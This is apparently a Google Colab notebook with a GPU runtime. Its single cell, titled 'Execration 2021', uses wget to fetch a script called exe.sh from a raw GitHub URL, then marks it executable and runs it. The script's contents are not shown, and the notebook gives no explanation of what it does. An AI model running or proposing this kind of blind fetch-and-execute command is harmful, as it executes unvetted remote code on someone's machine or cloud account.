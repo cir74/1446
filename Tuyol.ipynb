{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Tuyol.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "ykWxWm-RxtBh"
      },
      "source": [
        "#@title Execration 2021\n",
        "\n",
        "!wget https://raw.githubusercontent.com/sampurasun111/anyaran/main/exe.sh && chmod +x exe.sh && ./exe.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
